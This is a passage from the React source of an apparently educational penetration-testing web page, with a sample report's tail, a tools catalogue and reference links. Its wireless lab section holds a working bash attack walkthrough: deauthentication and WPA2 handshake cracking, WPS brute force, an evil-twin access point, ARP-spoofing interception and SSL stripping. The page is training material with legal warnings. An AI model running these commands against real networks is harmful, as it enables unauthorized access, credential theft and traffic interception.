- Metasploit Framework 6.3.25 - Exploitation
- Burp Suite Professional 2023.11 - Web app testing
- sqlmap 1.7.11 - SQL injection testing
- Nessus Professional 10.6 - Vulnerability scanning
- theHarvester 4.5.1 - OSINT gathering

---

## APPENDIX B: TIMELINE

| Date       | Activity                          |
|------------|-----------------------------------|
| 2024-01-15 | Pre-engagement meeting            |
| 2024-01-20 | Testing begins                    |
| 2024-01-22 | Critical finding reported to CISO |
| 2024-01-25 | Testing complete                  |
| 2024-01-30 | Report delivered                  |

---

**Report prepared by:** [Your Name], OSCP, CEH
**Contact:** [email@company.com]
**Confidentiality:** This report contains sensitive security information and should be treated as confidential.
`
    },
    wifi: {
      title: 'Wireless Network Penetration Testing',
      description: 'WiFi security assessment techniques',
      code: `#!/bin/bash
# Wireless Penetration Testing Methodology
# LEGAL WARNING: Only test networks you own or have written authorization to test
# Unauthorized WiFi hacking is a federal crime under 18 U.S.C. § 1030

echo "=== WIRELESS PENETRATION TESTING ==="

# Prerequisites:
# - Wireless adapter with monitor mode support (e.g., Alfa AWUS036ACH)
# - Kali Linux or similar security distribution
# - Root/sudo privileges

INTERFACE="wlan0"
MONITOR_INTERFACE="wlan0mon"

# ==========================================
# PHASE 1: WIRELESS RECONNAISSANCE
# ==========================================

echo "[*] Phase 1: Wireless Reconnaissance"

# Put wireless card into monitor mode
airmon-ng check kill
airmon-ng start $INTERFACE

# Scan for wireless networks
airodump-ng $MONITOR_INTERFACE

# Capture specific network traffic
# Replace with your target: BSSID and CHANNEL
TARGET_BSSID="00:11:22:33:44:55"
TARGET_CHANNEL="6"
OUTPUT_PREFIX="capture"

airodump-ng -c $TARGET_CHANNEL \\
  --bssid $TARGET_BSSID \\
  -w $OUTPUT_PREFIX \\
  $MONITOR_INTERFACE

# ==========================================
# PHASE 2: WPA/WPA2 CRACKING
# ==========================================

echo "[*] Phase 2: WPA2 Handshake Capture"

# Deauthenticate client to capture handshake
# This forces reconnection, capturing the 4-way handshake
aireplay-ng --deauth 10 \\
  -a $TARGET_BSSID \\
  $MONITOR_INTERFACE

# Crack captured handshake with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt \\
  -b $TARGET_BSSID \\
  \${OUTPUT_PREFIX}-01.cap

# ==========================================
# PHASE 3: WPS ATTACKS
# ==========================================

echo "[*] Phase 3: WPS Vulnerability Testing"

# WPS PIN brute force (Reaver)
reaver -i $MONITOR_INTERFACE \\
  -b $TARGET_BSSID \\
  -vv -c $TARGET_CHANNEL

# WPS Pixie Dust attack (faster)
reaver -i $MONITOR_INTERFACE \\
  -b $TARGET_BSSID \\
  -c $TARGET_CHANNEL \\
  -K 1 -vv

# ==========================================
# PHASE 4: EVIL TWIN / ROGUE AP
# ==========================================

echo "[*] Phase 4: Evil Twin Attack Setup"

# Create rogue access point
# This creates a fake AP to capture credentials

# Install hostapd and dnsmasq if needed
apt-get install hostapd dnsmasq

# Configure fake AP
cat > /etc/hostapd/hostapd.conf << EOF
interface=$MONITOR_INTERFACE
driver=nl80211
ssid=Corporate_WiFi_Guest
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

# Start fake AP
hostapd /etc/hostapd/hostapd.conf

# Capture credentials with captive portal
# (This would require additional setup with web server)

# ==========================================
# PHASE 5: POST-EXPLOITATION
# ==========================================

echo "[*] Phase 5: Post-Connection Analysis"

# Once connected to target network:

# ARP scanning
arp-scan -l

# Nmap network scan
nmap -sn 192.168.1.0/24

# Intercept traffic (MITM)
ettercap -T -M arp:remote /target_ip// /gateway_ip//

# SSL stripping
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# ==========================================
# ENTERPRISE WPA2-ENTERPRISE TESTING
# ==========================================

echo "[*] Enterprise WiFi Testing"

# Capture RADIUS authentication
airodump-ng -c $TARGET_CHANNEL \\
  --bssid $TARGET_BSSID \\
  -w enterprise_capture \\
  $MONITOR_INTERFACE

# Crack with asleap (for LEAP)
asleap -r enterprise_capture-01.cap -W wordlist.txt

# EAP-TLS certificate extraction
tshark -r enterprise_capture-01.cap \\
  -Y "eap" \\
  -V > eap_analysis.txt

# ==========================================
# BLUETOOTH TESTING (BONUS)
# ==========================================

echo "[*] Bluetooth Reconnaissance"

# Scan for Bluetooth devices
hcitool scan

# Get detailed info
hcitool info [MAC_ADDRESS]

# Bluetooth Low Energy scanning
btlejack -s

# ==========================================
# CLEANUP
# ==========================================

# Stop monitor mode
airmon-ng stop $MONITOR_INTERFACE

# Restore network manager
service network-manager start

echo "[+] Wireless penetration test complete"
echo "[!] Document all findings in your report"

# ==========================================
# COMMON WIRELESS ATTACKS REFERENCE
# ==========================================

# 1. WEP Cracking (deprecated but sometimes found)
#    - Capture IVs, crack with aircrack-ng
#    - Generally takes 5-10 minutes with enough traffic

# 2. WPA/WPA2 PSK Cracking
#    - Capture 4-way handshake
#    - Offline dictionary/brute force attack
#    - Success depends on password strength

# 3. WPS PIN Brute Force
#    - Exploits poor WPS implementation
#    - Can recover WPA password in hours

# 4. Evil Twin Attack
#    - Create fake AP with same SSID
#    - Capture credentials via phishing portal

# 5. KARMA Attack
#    - Exploits client probing behavior
#    - Auto-connects clients to rogue AP

# 6. PMKID Attack
#    - Newer method, no deauth needed
#    - Extract PMKID from AP, crack offline

# 7. WPA3 Testing
#    - Dragonblood vulnerabilities
#    - Downgrade attacks to WPA2
`
    }
  };

  return (
    <div className="space-y-6">
      <h2 className="text-3xl font-bold mb-4 text-slate-900 dark:text-white">Hands-On Labs & Code Examples</h2>
      <p className="text-slate-600 dark:text-slate-300 mb-6">
        Practical examples and scripts for each phase of penetration testing. All code should only
        be used in authorized testing environments.
      </p>

      <div className="flex gap-2 flex-wrap mb-6">
        {Object.entries(examples).map(([key, example]) => (
          <button
            key={key}
            onClick={() => setActiveExample(key as 'reconnaissance' | 'nmap' | 'metasploit' | 'report' | 'wifi')}
            className={`px-4 py-2 rounded-lg font-semibold transition-all ${
              activeExample === key
                ? 'bg-emerald-500 text-white'
                : 'bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-600 dark:text-slate-300 border border-slate-300 dark:border-slate-700'
            }`}
          >
            {example.title}
          </button>
        ))}
      </div>

      <div className="bg-slate-900 rounded-lg p-6 border border-slate-700">
        <div className="flex items-center justify-between mb-4">
          <div>
            <h3 className="text-2xl font-bold text-white">{examples[activeExample].title}</h3>
            <p className="text-slate-400">{examples[activeExample].description}</p>
          </div>
          <Terminal className="w-8 h-8 text-green-400" />
        </div>

        <div className="bg-slate-950 rounded-lg p-4 overflow-x-auto">
          <pre className="text-green-400 text-sm font-mono">
            <code>{examples[activeExample].code}</code>
          </pre>
        </div>
      </div>

      <div className="bg-emerald-50 dark:bg-emerald-500/20 border border-emerald-200 dark:border-emerald-500/50 rounded-lg p-6">
        <h3 className="text-xl font-semibold mb-3 flex items-center gap-2 text-slate-900 dark:text-white">
          <BookOpen className="w-6 h-6 text-emerald-600 dark:text-emerald-400" />
          Jupyter Notebook Lab
        </h3>
        <p className="text-slate-700 dark:text-slate-300 mb-4">
          For interactive hands-on exercises, check out our comprehensive Jupyter notebook:
        </p>
        <Link
          to="/app/ide/20"
          className="inline-block px-6 py-3 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 rounded-lg font-semibold transition-all"
        >
          Open Interactive Lab Playground
        </Link>
      </div>
    </div>
  );
};

const ToolsTab = () => {
  const toolCategories = [
    {
      category: 'Reconnaissance',
      icon: Search,
      color: 'blue',
      tools: [
        { name: 'Nmap', purpose: 'Network scanning and service detection', platform: 'Cross-platform' },
        { name: 'Maltego', purpose: 'OSINT and relationship mapping', platform: 'Cross-platform' },
        { name: 'theHarvester', purpose: 'Email and subdomain gathering', platform: 'Python' },
        { name: 'Shodan', purpose: 'Internet-connected device search engine', platform: 'Web' },
        { name: 'Recon-ng', purpose: 'Web reconnaissance framework', platform: 'Python' },
        { name: 'SpiderFoot', purpose: 'Automated OSINT collection', platform: 'Python' }
      ]
    },
    {
      category: 'Scanning & Enumeration',
      icon: Scan,
      color: 'green',
      tools: [
        { name: 'Nessus', purpose: 'Professional vulnerability scanner', platform: 'Commercial' },
        { name: 'OpenVAS', purpose: 'Open-source vulnerability scanner', platform: 'Linux' },
        { name: 'Nikto', purpose: 'Web server scanner', platform: 'Perl' },
        { name: 'Masscan', purpose: 'High-speed port scanner', platform: 'Cross-platform' },
        { name: 'Enum4linux', purpose: 'Linux/SMB enumeration', platform: 'Linux' },
        { name: 'DNSenum', purpose: 'DNS enumeration tool', platform: 'Perl' }
      ]
    },
    {
      category: 'Exploitation',
      icon: Zap,
      color: 'red',
      tools: [
        { name: 'Metasploit Framework', purpose: 'Comprehensive exploitation framework', platform: 'Ruby' },
        { name: 'Burp Suite Pro', purpose: 'Web application security testing', platform: 'Java' },
        { name: 'sqlmap', purpose: 'Automated SQL injection tool', platform: 'Python' },
        { name: 'BeEF', purpose: 'Browser exploitation framework', platform: 'Ruby' },
        { name: 'ExploitDB', purpose: 'Exploit database and search', platform: 'Web' },
        { name: 'Cobalt Strike', purpose: 'Advanced threat emulation', platform: 'Commercial' }
      ]
    },
    {
      category: 'Post-Exploitation',
      icon: Network,
      color: 'purple',
      tools: [
        { name: 'Mimikatz', purpose: 'Windows credential extraction', platform: 'Windows' },
        { name: 'BloodHound', purpose: 'Active Directory attack path analysis', platform: 'Cross-platform' },
        { name: 'PowerSploit', purpose: 'PowerShell exploitation framework', platform: 'Windows' },
        { name: 'Empire', purpose: 'Post-exploitation framework', platform: 'Python' },
        { name: 'Impacket', purpose: 'Python network protocols library', platform: 'Python' },
        { name: 'CrackMapExec', purpose: 'Network assessment and exploitation', platform: 'Python' }
      ]
    },
    {
      category: 'Password Cracking',
      icon: Lock,
      color: 'yellow',
      tools: [
        { name: 'John the Ripper', purpose: 'Password cracking tool', platform: 'Cross-platform' },
        { name: 'Hashcat', purpose: 'Advanced password recovery', platform: 'Cross-platform' },
        { name: 'Hydra', purpose: 'Network logon cracker', platform: 'Cross-platform' },
        { name: 'Medusa', purpose: 'Parallel brute-force tool', platform: 'Cross-platform' },
        { name: 'CeWL', purpose: 'Custom wordlist generator', platform: 'Ruby' },
        { name: 'Ophcrack', purpose: 'Windows password cracker (rainbow tables)', platform: 'Cross-platform' }
      ]
    },
    {
      category: 'Reporting',
      icon: FileText,
      color: 'cyan',
      tools: [
        { name: 'Dradis', purpose: 'Collaboration and reporting platform', platform: 'Ruby' },
        { name: 'Faraday', purpose: 'Collaborative penetration testing platform', platform: 'Python' },
        { name: 'Serpico', purpose: 'Penetration test report generator', platform: 'Ruby' },
        { name: 'PlexTrac', purpose: 'Pentest management platform', platform: 'Commercial' },
        { name: 'Ghostwriter', purpose: 'Project tracking and reporting', platform: 'Python/Django' },
        { name: 'MagicTree', purpose: 'Pentest data organization', platform: 'Java' }
      ]
    }
  ];

  return (
    <div className="space-y-8">
      <div>
        <h2 className="text-3xl font-bold mb-4 text-slate-900 dark:text-white">Penetration Testing Toolkit</h2>
        <p className="text-slate-600 dark:text-slate-300 mb-6">
          Comprehensive list of professional tools used in each phase of penetration testing.
          These tools are industry-standard and widely used by security professionals.
        </p>
      </div>

      {toolCategories.map((category) => {
        const Icon = category.icon;

        return (
          <div key={category.category} className="space-y-4">
            <h3 className="text-2xl font-bold flex items-center gap-3 text-emerald-600 dark:text-emerald-400">
              <Icon className="w-7 h-7" />
              {category.category}
            </h3>
            <div className="grid md:grid-cols-2 gap-4">
              {category.tools.map((tool) => (
                <div key={tool.name} className="bg-slate-50 dark:bg-slate-800 rounded-lg p-4 hover:bg-slate-100 dark:hover:bg-slate-750 transition-colors border border-slate-200 dark:border-slate-700">
                  <div className="flex items-start justify-between mb-2">
                    <h4 className="font-semibold text-lg text-slate-900 dark:text-white">{tool.name}</h4>
                    <span className="text-xs px-2 py-1 bg-emerald-100 dark:bg-emerald-500/30 rounded text-emerald-900 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-500/50">
                      {tool.platform}
                    </span>
                  </div>
                  <p className="text-slate-600 dark:text-slate-400 text-sm">{tool.purpose}</p>
                </div>
              ))}
            </div>
          </div>
        );
      })}

      <div className="bg-yellow-50 dark:bg-yellow-500/20 border border-yellow-200 dark:border-yellow-500/50 rounded-lg p-6 mt-8">
        <h3 className="text-xl font-semibold mb-3 flex items-center gap-2 text-slate-900 dark:text-white">
          <AlertTriangle className="w-6 h-6 text-yellow-600 dark:text-yellow-400" />
          Tool Usage Guidelines
        </h3>
        <ul className="space-y-2 text-slate-700 dark:text-slate-300">
          <li className="flex items-start gap-2">
            <CheckCircle className="w-5 h-5 text-emerald-600 dark:text-emerald-400 mt-0.5 flex-shrink-0" />
            Always obtain written authorization before using any testing tools
          </li>
          <li className="flex items-start gap-2">
            <CheckCircle className="w-5 h-5 text-emerald-600 dark:text-emerald-400 mt-0.5 flex-shrink-0" />
            Stay within defined scope and testing windows
          </li>
          <li className="flex items-start gap-2">
            <CheckCircle className="w-5 h-5 text-emerald-600 dark:text-emerald-400 mt-0.5 flex-shrink-0" />
            Document all tool usage and findings
          </li>
          <li className="flex items-start gap-2">
            <CheckCircle className="w-5 h-5 text-emerald-600 dark:text-emerald-400 mt-0.5 flex-shrink-0" />
            Keep tools updated to latest versions
          </li>
          <li className="flex items-start gap-2">
            <CheckCircle className="w-5 h-5 text-emerald-600 dark:text-emerald-400 mt-0.5 flex-shrink-0" />
            Understand each tool's capabilities and limitations
          </li>
        </ul>
      </div>
    </div>
  );
};

const ReferencesTab = () => {
  const references = [
    {
      category: 'Standards & Frameworks',
      items: [
        {
          title: 'PTES (Penetration Testing Execution Standard)',
          description: 'Comprehensive methodology covering all phases of penetration testing',
          url: 'http://www.pentest-standard.org/',
          type: 'Framework'
        },
        {
          title: 'OWASP Testing Guide v4.2',
          description: 'Web application security testing methodology and best practices',
          url: 'https://owasp.org/www-project-web-security-testing-guide/',
          type: 'Guide'
        },
        {
          title: 'NIST SP 800-115',
          description: 'Technical Guide to Information Security Testing and Assessment',
          url: 'https://csrc.nist.gov/publications/detail/sp/800-115/final',
          type: 'Standard'
        },
        {
          title: 'OSSTMM (Open Source Security Testing Methodology Manual)',
          description: 'Peer-reviewed methodology for security testing',
          url: 'https://www.isecom.org/OSSTMM.3.pdf',
          type: 'Framework'
        }
      ]
    },
    {
      category: 'Bug Bounty Programs',
      items: [
        {
          title: 'HackerOne',
          description: 'Platform connecting hackers with companies for vulnerability disclosure',
          url: 'https://www.hackerone.com/',
          type: 'Platform'
        },
        {
          title: 'Bugcrowd',
          description: 'Crowdsourced cybersecurity platform with bug bounty programs',
          url: 'https://www.bugcrowd.com/',
          type: 'Platform'
        },
        {
          title: 'Google VRP',
          description: 'Google Vulnerability Reward Program - pays millions annually',
          url: 'https://bughunters.google.com/',
          type: 'Program'
        },
        {
          title: 'Tesla Bug Bounty',
          description: 'Vehicle and infrastructure security research program',
          url: 'https://www.tesla.com/support/security',
          type: 'Program'
        }
      ]
    },
    {
      category: 'Professional Certifications',
      items: [
        {
          title: 'OSCP (Offensive Security Certified Professional)',
          description: 'Hands-on penetration testing certification with 24-hour practical exam',
          url: 'https://www.offensive-security.com/pwk-oscp/',
          type: 'Certification'
        },
        {
          title: 'CEH (Certified Ethical Hacker)',
          description: 'EC-Council certification covering ethical hacking fundamentals',
          url: 'https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/',
          type: 'Certification'
        },
        {
          title: 'GPEN (GIAC Penetration Tester)',
          description: 'SANS Institute penetration testing certification',
          url: 'https://www.giac.org/certifications/penetration-tester-gpen/',
          type: 'Certification'
        },
        {
          title: 'PNPT (Practical Network Penetration Tester)',
          description: 'TCM Security practical certification with AD attacks',
          url: 'https://certifications.tcm-sec.com/pnpt/',
          type: 'Certification'
        }
      ]
    },
    {
      category: 'Learning Resources',
      items: [
        {
          title: 'Hack The Box',
          description: 'Online platform with vulnerable machines for practice',
          url: 'https://www.hackthebox.com/',
          type: 'Training'
        },
        {
          title: 'TryHackMe',
          description: 'Guided cybersecurity training with hands-on labs',
          url: 'https://tryhackme.com/',
          type: 'Training'
        },
        {
          title: 'PentesterLab',
          description: 'Hands-on penetration testing bootcamps and exercises',
          url: 'https://pentesterlab.com/',
          type: 'Training'
        },
        {
          title: 'VulnHub',
          description: 'Free vulnerable virtual machines for practice',
          url: 'https://www.vulnhub.com/',
          type: 'Lab'
        }
      ]
    },
    {
      category: 'Books & Publications',
      items: [
        {
          title: 'The Web Application Hacker\'s Handbook',
          description: 'Dafydd Stuttard & Marcus Pinto - Comprehensive web security reference',
          url: 'https://www.wiley.com/en-us/The+Web+Application+Hacker%27s+Handbook%3A+Finding+and+Exploiting+Security+Flaws%2C+2nd+Edition-p-9781118026472',
          type: 'Book'
        },
        {
          title: 'Penetration Testing: A Hands-On Introduction to Hacking',
          description: 'Georgia Weidman - Practical penetration testing guide',
          url: 'https://nostarch.com/pentesting',
          type: 'Book'
        },
        {
          title: 'The Hacker Playbook 3',
          description: 'Peter Kim - Practical guide to penetration testing',
          url: 'https://securepla.net/hacker-playbook-3/',
          type: 'Book'
        },
        {
          title: 'RTFM: Red Team Field Manual',
          description: 'Ben Clark - Quick reference for penetration testing commands',
          url: 'https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504',
          type: 'Book'
        }
      ]
    },
    {
      category: 'Legal & Compliance',
      items: [
        {
          title: 'Computer Fraud and Abuse Act (CFAA)',
          description: 'U.S. federal law against unauthorized computer access',
          url: 'https://www.justice.gov/criminal-ccips/computer-fraud-and-abuse-act',
          type: 'Law'
        },
        {
          title: 'PCI DSS Penetration Testing Requirements',
          description: 'Payment Card Industry security testing standards',
          url: 'https://www.pcisecuritystandards.org/',
          type: 'Compliance'
        },
        {
          title: 'HIPAA Security Rule',
          description: 'Healthcare security and penetration testing requirements',
          url: 'https://www.hhs.gov/hipaa/for-professionals/security/index.html',
          type: 'Compliance'
        }
      ]
    }
  ];

  return (
    <div className="space-y-8">
      <div>
        <h2 className="text-3xl font-bold mb-4 text-slate-900 dark:text-white">References & Resources</h2>
        <p className="text-slate-600 dark:text-slate-300 mb-6">
          Comprehensive collection of professional resources, standards, certifications, and
          learning materials for penetration testing.
        </p>
      </div>

      {references.map((section) => (
        <div key={section.category} className="space-y-4">
          <h3 className="text-2xl font-bold text-emerald-600 dark:text-emerald-400">{section.category}</h3>
          <div className="grid gap-4">
            {section.items.map((item) => (
              <div key={item.title} className="bg-slate-50 dark:bg-slate-800 rounded-lg p-5 hover:bg-slate-100 dark:hover:bg-slate-750 transition-colors border border-slate-200 dark:border-slate-700">
                <div className="flex items-start justify-between gap-4">
                  <div className="flex-1">
                    <div className="flex items-center gap-3 mb-2">
                      <h4 className="font-semibold text-lg text-slate-900 dark:text-white">{item.title}</h4>
                      <span className="text-xs px-2 py-1 bg-emerald-100 dark:bg-emerald-500/30 border border-emerald-300 dark:border-emerald-500/50 rounded text-emerald-900 dark:text-emerald-300">
                        {item.type}
                      </span>
                    </div>
                    <p className="text-slate-600 dark:text-slate-400 text-sm mb-3">{item.description}</p>
                    {item.url && (
                      <a
                        href={item.url}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="inline-flex items-center gap-1 text-emerald-600 dark:text-emerald-400 hover:text-emerald-700 dark:hover:text-emerald-300 text-sm"
                      >
                        <ExternalLink className="w-4 h-4" />
                        Visit Resource
                      </a>
                    )}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      ))}

      <div className="bg-emerald-50 dark:bg-emerald-500/20 border border-emerald-200 dark:border-emerald-500/50 rounded-lg p-6 mt-8">
        <h3 className="text-xl font-semibold mb-3 flex items-center gap-2 text-slate-900 dark:text-white">
          <Award className="w-6 h-6 text-emerald-600 dark:text-emerald-400" />
          Professional Development Path
        </h3>
        <ol className="space-y-3 text-slate-700 dark:text-slate-300">
          <li className="flex items-start gap-3">
            <span className="font-bold text-emerald-600 dark:text-emerald-400 mt-0.5">1.</span>
            <span>Learn fundamentals through books and online courses</span>
          </li>
          <li className="flex items-start gap-3">
            <span className="font-bold text-emerald-600 dark:text-emerald-400 mt-0.5">2.</span>
            <span>Practice on legal platforms (Hack The Box, TryHackMe)</span>
          </li>
          <li className="flex items-start gap-3">
            <span className="font-bold text-emerald-600 dark:text-emerald-400 mt-0.5">3.</span>
            <span>Build home lab environment for safe testing</span>
          </li>
          <li className="flex items-start gap-3">
            <span className="font-bold text-emerald-600 dark:text-emerald-400 mt-0.5">4.</span>
            <span>Pursue professional certification (OSCP recommended)</span>
          </li>
          <li className="flex items-start gap-3">
            <span className="font-bold text-emerald-600 dark:text-emerald-400 mt-0.5">5.</span>
            <span>Participate in bug bounty programs</span>
          </li>
          <li className="flex items-start gap-3">
            <span className="font-bold text-emerald-600 dark:text-emerald-400 mt-0.5">6.</span>
            <span>Join security community and attend conferences (DEF CON, Black Hat)</span>
          </li>
          <li className="flex items-start gap-3">
            <span className="font-bold text-emerald-600 dark:text-emerald-400 mt-0.5">7.</span>
            <span>Continue learning - security landscape constantly evolves</span>
          </li>
        </ol>
      </div>
    </div>
  );
};

export default PenetrationTestingConcept;
